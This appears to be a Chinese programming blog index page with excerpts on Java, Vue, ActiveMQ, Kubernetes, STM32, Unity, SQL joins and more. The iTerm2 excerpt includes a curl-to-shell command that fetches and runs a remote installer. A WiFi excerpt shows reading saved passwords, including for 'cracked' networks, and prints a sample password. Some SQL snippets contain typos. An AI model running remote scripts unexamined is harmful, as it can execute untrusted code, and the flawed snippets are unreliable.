4.查看了初始化FTPClient方法，尝试更换后，无效；发现连接处是使用的AutoConnect，感觉好像坏在这个Auto上了
看一下AutoConnect作用：
这补了个小知识，FTPS是在FTP基础上需要TLS和SSL认证的，但是和基于SSH的FTP是不一样的（即SFTP）。那AutoConnect应该就是自动识别是FTP还是FTPS，然后进行连接。这里它应该认为是FTPS，然后去连接，同时我们的连接信息中缺少对于FTPS连接认证的凭据，导致不成功；
解决：将AutoConnect改为Connect就好了；
延申：
反编译查看了一下AutoConnect的源码：
他是获取多个FtpProfile，并取第一个进行连接；
查看AutoDetect方法中，明显有很多关于SSL的操作，但是没确定是哪块操作导致这个错误
总结：对于AutoConnect和Connect还是要谨慎使用
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d6c993c27603a26d764950c42288ee2c/" rel="bookmark">
			关于fileupload multipart/form-data or multipart/mixed stream, content type header is null
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		the request doesn't contain a multipart/form-data or multipart/mixed stream, content type header is null 表单提交: form method="post" action="/StudentUnionCacheServlet" enctype="multipart/form-data"&gt; 后台代码:
// 解析文件 ServletFileUpload sfu = new ServletFileUpload(factory); int count = 0; try { FileItemIterator fii = sfu.getItemIterator(request); // 创建一个格式化时间对象 SimpleDateFormat sdf = new SimpleDateFormat("yyyy年MM月dd日"); while (fii.hasNext()) { 但是这样的话会报一个错 the request doesn't contain a multipart/form-data or multipart/mixed stream, content type header is null 奇怪的是还能继续执行完并得到封装完的JavaBean对象.
为了给以后修改代码省点力,就继续修改测试,查阅了大量的类似的文章.发现问题一样但是效果却没有用.过后在看别人的实现发现了ServletFileUpload.isMultipartContent(request) 功能是 确定请求是否包含多部分内容的实用程序方法 先验证再使用 !!!!!!!!!!!!!!!!!
boolean isMultipart = ServletFileUpload.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d6c993c27603a26d764950c42288ee2c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5fbd48436ac0ff45d11c2932c85d531b/" rel="bookmark">
			vue切换版本
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		从3.X切换回2.X
npm uninstall -g @vue/cli
npm install -g vue-cli@2.9.6
该链接包含了从2.X切换到3.X
vue3安装教程 - 简易版_Z_路人的博客-CSDN博客_vue3安装
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/011f042e177a51a4d569bdaa7887809f/" rel="bookmark">
			ActiveMQ安装(含安装包)Unable to locate the class org.apache.activemq.console.Main: java.lang.UnsupportedCl
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一 解决ActiveMQ启动报错及安装
二 ActiveMQ简介
一 解决ActiveMQ启动报错及安装 WrapperSimpleApp: Unable to locate the class org.apache.activemq.console.Main: java.lang.UnsupportedClassVersionError: org/apache/activemq/console/Main : Unsupported major.minor version 55.0
本地jdk 1.8 用的ActiveMQ 5.17的版本,下载解压后启动程序如下图所示报错
原因:
当前版本的ActiveMQ和本地的jdk版本不搭
解决办法:
更换ActiveMQ版本为5.15
官方下载地址:ActiveMQ
链接：https://pan.baidu.com/s/1ZEKlg18r7Gz9z6k4h4mR0Q 提取码：0703 下载之后解压即可使用
启动
启动好了
二 ActiveMQ简介 Apache ActiveMQ : Apache软件基金会所研发的开放源代码消息中间件
支持的编程语言包括：C、C++、C#、Delphi、Erlang、Adobe Flash、Haskell、Java、JavaScript、Perl、PHP、Pike、Python和Ruby
支持的协议包括：OpenWire、REST、STOMP、WS-Notification、MQTT、XMPP以及AMQP
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8ca728d8e9e46fc1e86a108147483633/" rel="bookmark">
			C语言学习笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		C基础 1. 概述 1.1开发环境 C程序生成过程 编辑器————&gt;源代码文件
编译器————&gt;二进制文件
链接器————&gt;（加上库二进制文件）可执行程序
集成开发环境 VS2010安装
新建项目
先新建解决方案再建项目
已安装的模板-其他项目类型-Visual Stdio 解决方案解决方案资源管理器-添加新建项目 解决方案和项目一起新建
编译链接
生成或生成解决方案运行或调试可执行程序 mingw 下载地址
$ gcc test1.c test2.c -o main.out
$ ./main.out
2. 数据类型 2.1 基本数据类型 1. 整形 精度为1 整形 int 四字节长度（windows操作系统，64位机）
有符号整型 int
表示范围 (-2)^(31)到 2^31 - 1 无符号整型 unsigned int
表示范围 0到2^32 -1 短整型 short 二字节长度
有符号短整型 short
表示范围 (-2)^(15)到 2^15 - 1 和无符号短整型 unsigned short
表示范围 0到 2^16 - 1 长整型 long **四字节长度 **（long占据的字节数还和编译器的数据模型相关）VC++ 以后版本还有long long 类型
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8ca728d8e9e46fc1e86a108147483633/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/67042c2f548fedf375417e683d250a70/" rel="bookmark">
			第五单元 用python学习微积分（三十五）幂级数和泰勒级数下
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文内容来自于学习麻省理工学院公开课：单变量微积分-期末复习-网易公开课
Bullseye：第五单元 用python学习微积分（三十四）泰勒级数
Bullseye：第三单元 用python学习微积分（十九）FTC2（下）和定积分在对数和几何上的应用
目录
一、幂级数（Power series）
1、复习
（1）有一个数字R， ​编辑, 当 |x| &lt; R , 级数的和是收敛的， 当 |x| &gt; R , 级数的和是发散的，R就被称作衰减半径。
（2）当 |x| &lt; R，也就是在收敛半径内部，f(x) 可以无限次就导，就像多项式求导。同时有 ​编辑。
（3）可以写成： ​编辑
2、例1 几何级数
​3、求取sin(x)
4、新的幂级数
（1）乘法
​（2）求导
（3）积分
（4）变量替换
一、幂级数（Power series） 多项式是幂级数的一个例子 1、复习 （1）有一个数字R， , 当 |x| &lt; R , 级数的和是收敛的， 当 |x| &gt; R , 级数的和是发散的，R就被称作衰减半径。 （2）当 |x| &lt; R，也就是在收敛半径内部，f(x) 可以无限次就导，就像多项式求导。同时有 。 （3）可以写成： 2、例1 几何级数 假设有
由于
（ R=1 ）
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/67042c2f548fedf375417e683d250a70/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dac62278aad3a25858038bcd88855651/" rel="bookmark">
			iTerm2配置(rz/sz命令)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.安装iTerm2 到iTerm2官网下载安装
2.安装HomeBrew 参考博客：https://brew.idayer.com/guide/start/
作者写的非常细，但我照着执行下来有2个注意事项
⚠️
1.别急忙执行安装命令，先得去镜像助手那里选择适合自己的源，特别是记得先查看自己的终端类型；
2.安装完成之后，执行下面语句提示没有对应路径，原因是cask没装
git -C "$(brew --repo homebrew/cask)" remote set-url origin https://mirrors.ustc.edu.cn/homebrew-cask.gi 只要执行博客里的下面几行命令就行了
cd "$(brew --repo)/Library/Taps/" cd homebrew git clone https://mirrors.ustc.edu.cn/homebrew-cask.git 3.安装zsh # mac os brew install zsh # centos yum -y install zsh git # debain ubuntu apt install -y zsh git 4.安装 Oh My Zsh 参考博客：https://blog.csdn.net/Jrieh/article/details/123959873
sh -c "$(curl -fsSL https://gitee.com/mirrors/oh-my-zsh/raw/master/tools/install.sh)" 5.添加插件 zsh-syntax-highlighting(语法高亮) # mac os brew install zsh-syntax-highlighting echo 'source /usr/local/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh' &gt;&gt; ~/.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dac62278aad3a25858038bcd88855651/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6a4997654794743da0af49551252d08b/" rel="bookmark">
			n个字母的全排列
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 设str是含有n个不同字符的数组例如12345，perm（str,k,n）为str[0]~str[k]的所有字符全排序输出函数，n为str数组字符个数。以此类推，perm(str,k-1,n)处理的字符个数比perm(str,k,n)处理的字符个数少一个。假定perm(str,k-1,n)可求，对于第k个位置可以任取str[0]~str[k-1]内任意元素作为str[k]，再组合perm(str,k+1,n)得到perm(str,k,n)。 再递归之前先选取一个元素和位置k的元素交换，这一级递归完成之 算法 void perm(char str[],int k,int n) { int i,j; int temp; if(k==0) { for(i=0;i&lt;n;i++) cout&lt;&lt;str[i]; cout&lt;&lt;endl; } else { for(i=0; i&lt;=k; i++){ temp=str[k]; str[k]=str[i]; str[i]=temp;//任取str[i]与str[k]交换 perm(str,k-1,n); temp=str[k]; str[k]=str[i]; str[i]=temp;//还原str[k]和str[i]得到原始数组，下次再任取 } } } 测试环境 #include&lt;stdio.h&gt; #include&lt;iostream&gt; #define N 10 using namespace std; void perm(char str[],int k,int n) { int i,j; int temp; if(k==0) { for(i=0;i&lt;n;i++) cout&lt;&lt;str[i]; cout&lt;&lt;endl; } else { for(i=0; i&lt;=k; i++){ temp=str[k]; str[k]=str[i]; str[i]=temp;//任取str[i]与str[k]交换 perm(str,k-1,n); temp=str[k]; str[k]=str[i]; str[i]=temp;//还原str[k]和str[i]得到原始数组，下次再任取 } } } int main(){ char a[10] = {'a','b','c','d'}; perm(a,3,4); return 0; } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7c29d3ec78a0a5f5a242917376c61e46/" rel="bookmark">
			Vue2全家桶&#43;Element搭建的PC端在线音乐网站
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 1，前言2，已有功能3，使用4，目录结构5，页面效果 1，前言 项目基于Vue2全家桶及网易云音乐 Node Api实现，网站风格简约清新，体验比较流畅。
下载地址：https://github.com/wp993080086/music-website
预览地址：music-website
2，已有功能 网易云APP扫码登录 &amp; 网易云账号登录注册音乐播放器歌单 &amp; 详情歌手 &amp; 详情MV &amp; mv详情排行榜搜索评论歌词 3，使用 Clone该项目：git@github.com:wp993080086/music-website.git安装：npm install运行：npm run serve测试环境打包：npm run test正式环境打包：npm run build同时打包正式环境 &amp; 测试环境：npm run all修复：npm run lint 4，目录结构 │ .env.development │ .env.production │ .env.test =&gt; .env环境文件 │ .eslintignore =&gt; eslint忽略配置 │ .eslintrc.js =&gt; eslint配置 │ .gitignore =&gt; git忽略配置 │ babel.config.js │ package-lock.json │ package.json │ README.md =&gt; 说明文件 │ vue.config.js =&gt; 脚手架配置 ├─node_modules =&gt; 依赖 ├─public └─src │ App.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7c29d3ec78a0a5f5a242917376c61e46/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/026527e7251f95bf90ef1d07bb6d99aa/" rel="bookmark">
			【Coppeliasim4.3】基于remoteApi的C&#43;&#43; 示教器操作仿真器中的UR10
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		C++示教器
场景截图
视频演示
笔记：
一、用于 VS 2022 .NET 框架的 C++ Windows 窗体
通过用 C++ 编写的 Windows 窗体项目扩展 Visual Studio 2022 。此类项目创建的应用程序具有图形用户界面。它们基于 .NET Framework。您可以使用所有常见的 Windows 控件，如按钮、菜单、文本框等。
与传统 C++ 程序的主要区别在于，它不是使用控制台进行用户交互
cout &lt;&lt; "Hello world" &lt;&lt; endl;
您可以使用 Windows 控件，例如 TextBox
textBox1-&gt;AppendText("Hello World");
安装扩展 https://marketplace.visualstudio.com/items?itemName=RichardKaiser.cppclrwinf
创建项目时选择CppCLR_WinFormsProject
二、coppeliasim类是对remoteApi的封装，可以操作机器人、获取传感器数据.通过调用脚本函数进行任何可能的操作。
.h文件：
#pragma once /* NON_MATLAB_PARSING MAX_EXT_API_CONNECTIONS=255 _CRT_SECURE_NO_WARNINGS DO_NOT_USE_SHARED_MEMORY */ #include &lt;stdlib.h&gt; #include &lt;iostream&gt; #include &lt;windows.h&gt; #include &lt;stdio.h&gt; #include &lt;process.h&gt; #include &lt;fstream&gt; //#include &lt;msclr\marshal_cppstd.h&gt; extern "C" { #include "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/026527e7251f95bf90ef1d07bb6d99aa/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/264c8347aadca5a16a74fb1d929a0d40/" rel="bookmark">
			IIS日志分析工具
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 安装 需要先安装Log Parser
下载地址：
http://www.microsoft.com/en-us/download/details.aspx?displaylang=en&amp;id=24659
安装Log Parser Studio下载地址：
Browse code samples | Microsoft Docs 运行 安装完成第一个文件之后，解压第二个文件，直接运行LPS.exe即可。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9cc39b2362a33b68d83274d29decff4b/" rel="bookmark">
			作为一名测试工程师，你要有灵魂！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		来自广州网友的私信：「 测试简历要怎么做？」
首先博主要吐槽一下，这个问题可能是这位网友是第一次问我，可是我听了不少于上百遍，扪心自问，做简历真的很难？况且还是用文字描述，不是要你上台表述自己！希望大家多花点时间好好总结下自己的工作！
广州网友：你好，大佬，这是我的简历，你能帮我看看然后修正一下吗？
小编：这里有一份如何制作简历的文章以及简历模板资源，2022年互联网企业软件测试面试宝典！你先看看，找找方法。
广州网友：我看了但是我感觉自己还是写的不太好，你还是帮我看看吧！
小编：好吧，行，我看看
以上是一段通过我的文章进行私信我的网友，作为一名博主，任何粉丝在请求我帮助的时候，我时间空闲的情况或正好看到微信消息，我都会回复，给予一定的建议。
个人从以上对话发现问题，我简单说下：
1. 该网友简历是工作2年，准备跳槽，一直做的是功能测试，对于自己的能力自信还是不够，链条效应，所以总感觉自己的简历也写的不行，需要他人确认给与肯定 | 关键词：缺乏自信
2. 我浏览下一下简历后，确实有挺多修正的地方，例如核心技能的描述词汇不够专业、细心，另外核心的数据指标没有体现，很难让面试官看到你的优点。 | 关键词：日常缺少总结、不够细心
ps：测试人员要学会细心，这是个很加分的优点！平时工作中会体现
3. 我前期发给他我个人的文章以及简历模板以上几点均有重点描述，可是让他自信修正后，还是这样，打心里来说，他应该是没有细看，习惯依赖他人。| 关键词：惰性思维
ps：学会自己先思考，花点时间去琢磨下，不会的再去请教他人，养成一个良好的做事方式，久而久之良性循环！
以上不带任何批评意思，希望这位V友看到也不要建议，我只想通过我的个人IP分享一些正确的价值观。
再次简要总结一下做好一份简历「 核心关键 」
1.个人介绍要精简
2. 技能栈不会的不要写，关键词描述要准确，熟悉与熟练一词之差，可能会让你打脸，技能描述关键词要精准，熟练技能重点突出！
3. 项目经验要用数据体现个人价值，突出成果
4. 个人评价不要太虚伪，尊重他人，真诚对待面试官，百术不如一诚。
Python测试社区博主介绍：7年测试人，某大厂高级系统测试工程师，坐拥1.5W粉丝守护，感谢大家一直以来的支持，欢迎加微信交流：695214599
个人IP信条：分享真实生活，做个有温度的测试
推荐阅读：
现在零基础转行软件测试还OK吗？
现在的工作就好像这碗牛肉面，腻了！
2022年互联网企业软件测试面试宝典！
关注并星标订阅号，第一时间接收最新消息，支持小编，点赞、分享广而告之。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/af7a88be50e530d67b0759e52a6c0238/" rel="bookmark">
			权重衰退（PyTorch）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		https://courses.d2l.ai/zh-v2/
文章目录 权重衰减范数与权重衰减演示对最优解的影响参数更新法则总结 从零开始实现高维线性回归初始化模型参数定义 L 2 L_2 L2​范数惩罚定义训练代码实现忽略正则化直接训练使用权重衰减 简洁实现QA 权重衰减 前面我们描述了过拟合的问题，本节我们将介绍一些正则化模型的技术。 我们总是可以通过去收集更多的训练数据来缓解过拟合。 但这可能成本很高，耗时颇多，或者完全超出我们的控制，因而在短期内不可能做到。 假设我们已经拥有尽可能多的高质量数据，我们便可以将重点放在正则化技术上。
范数与权重衰减 使用均方范数作为硬性限制
通过限制参数值的选择范围来控制模型容量
m i n l ( w , b ) s u b j e c t t o ∣ ∣ w ∣ ∣ 2 ≤ θ min\;l(w,b)\quad subject\;to\;||w||^2\le\theta minl(w,b)subjectto∣∣w∣∣2≤θ通常不限制偏移 b （限不限制都差不多）小的 θ \theta θ 意味着更强的正则项 一个多项式中的高次项的系数变小了，函数也就变平滑了。
使用均方函数作为柔性限制
对每个 θ \theta θ，都可以找到 λ \lambda λ使得之前的目标函数等价于下面
m i n l ( w , b ) + λ 2 ∣ ∣ w ∣ ∣ 2 min\;l(w,b)+{\lambda \over 2}||w||^2 minl(w,b)+2λ​∣∣w∣∣2 可以通过拉格朗日乘子来证明 超参数 λ \lambda λ控制了正则项的重要程度 λ = 0 \lambda=0 λ=0：无作用 λ − &gt; ∞ ， w ∗ − &gt; 0 \lambda \;-&gt; \infty，w^*-&gt;0 λ−&gt;∞，w∗−&gt;0 λ 2 ∣ ∣ w ∣ ∣ 2 {\lambda \over 2}||w||^2 2λ​∣∣w∣∣2 就是 penalty，惩罚项
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/af7a88be50e530d67b0759e52a6c0238/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/db229f7042cacde3f4324124ad293c60/" rel="bookmark">
			mysql的七种join连接查询
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		mysql join查询是开发中必不可少的知识，以下整理了常见的七种join查询语句，方便学习
一、内连接
sleect * from a inner join b on a.key = b.ky; 二、左连接
select * from a left join b on a.key = b.key; 三、右连接
select * from a right join b on a.key - b.key; 四、左独占
select * from a left join b on a.key = b.key where b.kry is null; 五、右独占
select * from a right join b on a.key = b.key where a.key is null; 六、全连接
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/db229f7042cacde3f4324124ad293c60/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8374b7cbae522355b1ff22bebeb875bd/" rel="bookmark">
			如何查看已链接手机的wifi密码？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		如何查看手机破解WIFI的密码 按步骤来：
很多朋友都遇到过朋友来家里了问自己wifi密码多少？顿时有点懵逼的局面，还有就是自己用万能钥匙破解的wifi如何用电脑来链接呢？今天我就来说一个我用的方法；
打开手机设置——找到无线网连接——点击已经链接的wifi，就会弹出一个二维码。
把这个二维码双击屏幕截图到手机里（当然有的手机截图是别的方式)
找一个有扫一扫功能的软件，用扫一扫打开相册找到你保存的二维码。
这时候会出来一串字符
红色部分就是密码，如果连接不上多尝试几下就可以啦
WIFI:T:WPA;S:CMCC-2cg5;P:784513p9;;
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f93bb4ec2b2af8629c2dec4e49e1025a/" rel="bookmark">
			Skywalking Agent原理剖析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Skywalking Agent原理剖析 Skywalking Agent原理剖析1 agent原理1.1 Java Agent1.2 定义自己的agent1.3 自定义方法耗时统计 2 Byte Buddy2.1 Byte Buddy应用场景2.2 Byte Buddy学习2.2.1 ByteBuddy语法2.2.2 ByteBuddy创建代理2.2.3 ByteBuddy程序中的应用 3 Skywalking源码导入31 源码环境搭建3.2 模块分析 4 Skywalking Agent启动流程剖析4.1 Skywalking Agent架构4.2 Skywalking Agent启动流程 5 Skywalking Agent源码剖析5.1 配置初始化5.2 插件加载5.3 解析插件5.3.1 PluginResourcesResolver5.3.2 PluginFinder5.3.3 AgentBuilder Skywalking Agent原理剖析 1 agent原理 使用Skywalking的时候，并没有修改程序中任何一行 Java 代码，这里便使用到了 Java Agent 技术，我们接下来展开对Java Agent 技术的学习。
1.1 Java Agent Java Agent 是从 JDK1.5 开始引入的，算是一个比较老的技术了。作为 Java 的开发工程师，我们常用的命令之一就是 java 命令，而 Java Agent 本身就是 java 命令的一个参数（即 -javaagent）。正如上一课时接入 SkyWalking Agent 那样，-javaagent 参数之后需要指定一个 jar 包，这个 jar 包需要同时满足下面两个条件：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f93bb4ec2b2af8629c2dec4e49e1025a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6880d6aa9fd808ebb3ea9280faa3e9c9/" rel="bookmark">
			Kubernetes搭建
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Kubernetes搭建 Kubernetes搭建部署组件介绍K8s 集群架构图k8s控制组件控制平面kube-apiserverkube-schedulerkube-controller-manageretcd k8s运行组件k8s节点容器集容器运行时引擎kubeletkube-proxy k8s 存储组件持久存储容器镜像仓库底层基础架构 kubeadm部署k8skubeadm简介kubeadm安装准备环境要求准备工作 Docker环境安装安装kubeadm安装组件导入镜像 初始化Master执行初始化命令创建配置文件添加flannel网络创建网络查看集群状态查看版本信息查看集群信息删除节点 开启自动补全永久生效 dashboard启动dashboard Kubernetes搭建 部署组件介绍 我们把一个有效的 Kubernetes 部署称为集群。您可以将 Kubernetes 集群可视化为两个部分：
​ 控制平面与计算设备（或称为节点）。每个节点都是其自己的 Linux环境，并且可以是物理机或虚拟机。每个节点都运行由若干容器组成的容器集。
K8s 集群架构图 以下 K8s 架构图显示了 Kubernetes 集群的各部分之间的联系：
k8s控制组件 控制平面 K8s 集群的神经中枢
​ 让我们从 Kubernetes 集群的神经中枢（即控制平面）开始说起。在这里，我们可以找到用于控制集群的 Kubernetes 组件以及一些有关集群状态和配置的数据。这些核心 Kubernetes 组件负责处理重要的工作，以确保容器以足够的数量和所需的资源运行。
​ 控制平面会一直与您的计算机保持联系。集群已被配置为以特定的方式运行，而控制平面要做的就是确保万无一失。
kube-apiserver K8s 集群API，如果需要与您的 Kubernetes 集群进行交互，就要通过 API
​ Kubernetes API 是 Kubernetes 控制平面的前端，用于处理内部和外部请求。API 服务器会确定请求是否有效，如果有效，则对其进行处理。您可以通过 REST 调用、kubectl 命令行界面或其他命令行工具（例如 kubeadm）来访问 API。
kube-scheduler K8s 调度程序，您的集群是否状况良好？如果需要新的容器，要将它们放在哪里？这些是 Kubernetes 调度程序所要关注的问题。
​ 调度程序会考虑容器集的资源需求（例如 CPU 或内存）以及集群的运行状况。随后，它会将容器集安排到适当的计算节点。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6880d6aa9fd808ebb3ea9280faa3e9c9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/26928210109bc3a0bbdbcb09a37ce90b/" rel="bookmark">
			git reset --soft 版本回退多了，怎么恢复？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		正常可能是想git reset --soft 回退到上一版本，不小心回退到了历史的某个版本，本地出现了一堆未提交的文件，想恢复到最新版本，怎么搞？ git reset --soft 使用回退多了，说白了，就是本地 Head 指向的版本不对了，指向了一个历史版本，那么把指针指向最新的版本就好了。
但问题是，此时执行 git log 只能查看到，历史到你回退到的这一版本，真正最新的版本 通过 git log已经看不到了，怎么办？
使用命令：
git reflog 执行结果如下：
找到想恢复到的版本，复制最前面黄色部分的id，执行
git reset --soft [id] Done!
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3eae2e4becd41710b2e69a97937331d4/" rel="bookmark">
			STM32使用过程中的踩坑记录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 中断函数不要随意使用prinf()函数 记调试步进电机加速减速过程的一次大坑。
2. 使用HAL库的时候不要在中断中使用HAL_Delay()函数 HAL库的HAL_Delay()函数是通过Systick定时器的1ms中断实现的，一般情况下Systick定时器的优先级设置为最低，因此在更高优先级的中断触发后导致HAL_Delay()函数uwtick值无法更新，因此程序会卡死在HAL_Delay()函数中。
3.注意STM32库在配置串口字长时是包含校验位的字长，而一般上位机配置的串口字长是不包含校验位的。 这点在配置使用校验时是非常重要的，如果配置出错会导致通讯不正常。
4.使用不同的开发板的时候一定要注意不同板子上的晶振可能是不一样的 之前用的板子是8M的晶振，配置好了可以正常使用。后面换了板子是25M晶振的。只修改了SystemClock_Config()函数中的因子，忘记修改晶振配置的值，导致时钟频率一直不对。晶振不同时，一定要到stm32xxxx_hal_conf.h中修改HSE_VALUE为相应的晶振值
5.移植FreeRTOS，让stm32hal和freeRTOS共用SYSTICK，程序全速运行会卡死在hardfault中断，但单步调试可以运行过去 在之前的板子上可以运行，但在后面新作的板子上出现了这个问题。（这一点感觉好奇怪）
systick中断代码：
void SysTick_Handler(void) { HAL_IncTick(); #if (INCLUDE_xTaskGetSchedulerState == 1 ) if (xTaskGetSchedulerState() != taskSCHEDULER_NOT_STARTED) { #endif /* INCLUDE_xTaskGetSchedulerState */ xPortSysTickHandler(); #if (INCLUDE_xTaskGetSchedulerState == 1 ) } #endif /* INCLUDE_xTaskGetSchedulerState */ } 在stm32f4xx_it.c文件中一定要包含FreeRTOS.h头文件，否则会导致上述函数中条件编译的宏不会生效，导致在还没开启任务调度时，触发SysTick中断后会直接进入xPortSysTickHandler()函数，导致触发了hardfault中断。
6. STM32F429使用TIM2和TIM5的的注意事项 TIM2和TIM5是32位定时器，TIM2和TIM5产生PWM并通过DMA传输时必须按32位传输（即DMA设置的长度位32位）且用于为输出比较寄存器赋值的数组也必须为32为的（在使用TIM2和定时器5驱动WS2812时一定要注意）。
注：移植之前的ws21812灯珠驱动程序（之前用的是TIM3属于16位寄存器），改到TIM2来驱动用逻辑分析仪一直没有测到输出波形，又测试了TIM5也是这样还以为TIM2和TIM5的PWM不能够通过DMA传输呢！这个事情告诉我们一定要认真读手册 7. STM32F429不能够通过PA1和PA2输出PWM https://blog.csdn.net/xiaoyuanwuhui/article/details/109597401中有记录
8. STM32的部分外设在初始化初始化函数只能执行1次！！！ 在使用STM32ADC外设时，红外测距模块和电流采样模块都用到了ADC，因而在两个模块分别初始化的时候调用了两次ADC初始化的函数bsp_adc1Init()，导致电流检测数据不正常（实际硬件测量没有电压，但ADC的采样值却有500多的值（实际应该在10左右））。在屏蔽掉红外测距模块的初始化函数后，数据便恢复正常了。
解决方法：仿照crazyfile代码中硬件外设初始化的方法，定义一个isInit的变量用于指示当前外设初始化函数是否执行过，如果执行过则直接跳出。
static bool isInit = false; void bsp_adc1Init(void) { if(isInit) { return; } /* init adc module */ //.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3eae2e4becd41710b2e69a97937331d4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f8c9be08526cf027c0a17cafa4eda879/" rel="bookmark">
			Unity脚本的基础语法(8)-协同程序与销毁方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		协同程序 协同程序，即在主程序运行的同时开启另一段逻辑处理来协同当前程序的执行。但它与多线程程序不同，所有的协同程序都是在主程序中运行的，它还是一个单线程程序。在Unity中可以通过StartCoroutine方法来启动协同。
StartCoroutine方法为MonoBehavior类中的一个方法，即该方法必须在MonoBehavior或继承于MonoBehavior的类中调用。StartCoroutine方法可以将返回值为IEnumerator的类型方法作为参数
void Start() { StartCoroutine(doThing1());//开启doThing1协同程序 } IEnumerator doThing1()//声明doThing方法 { yield return StartCoroutine(doThing2());//开启doThing2协同程序 } IEnumerator doThing2() { yield return new WaitForSeconds(2);//协同程序休眠2s } 与销毁相关的方法 在游戏的开发过程中，经常会遇见对象、组件、资源等在使用完毕后就失去了作用的情况，如果放任其不管，轻则影响项目运行效率，重则可能影响到项目的正常运行。因此，必须有一类方法来管理、删除这些没有用的资源。
不同功能的Destroy方法 函数功能Object.Destroy删除游戏对象、组件或资源NetWork.Destroy销毁网络对象MonoBehavior.OnDestroy脚本被销毁时调用 Object.Destroy方法 Object.Destroy方法可以将对象立即销毁，也可以设置时间后销毁。如果删除的对象是一个组件，则该组件会被移除。
public GameObject obj; void Start() { Destroy(obj.GetComponent&lt;Rigidbody&gt;());//销毁游戏物体的刚体组件 Destroy(obj, 5);//5s后删除obj游戏对象 } NetWork.Destroy方法 NetWork.Destroy方法可以销毁网络对象，该对象有两种重载方式
public static void Destroy(NetworkViewID viewID) public static void Destory(Gameobject gameobject) 1、系统会删除所有和该ViewID相关的物体 2、销毁网络上的游戏对象 Network.Destory(GetComponent&lt;NetworkView&gt;().viewID) Network.Destory(gameobject) MonoBehaviour.OnDestroy方法 MonoBehaviour.OnDestroy方法是MonoBehaviour中的销毁回调方法
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1b2c9a7273bc5ab6c52640444d281e9c/" rel="bookmark">
			K8S入门以及应用场景
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
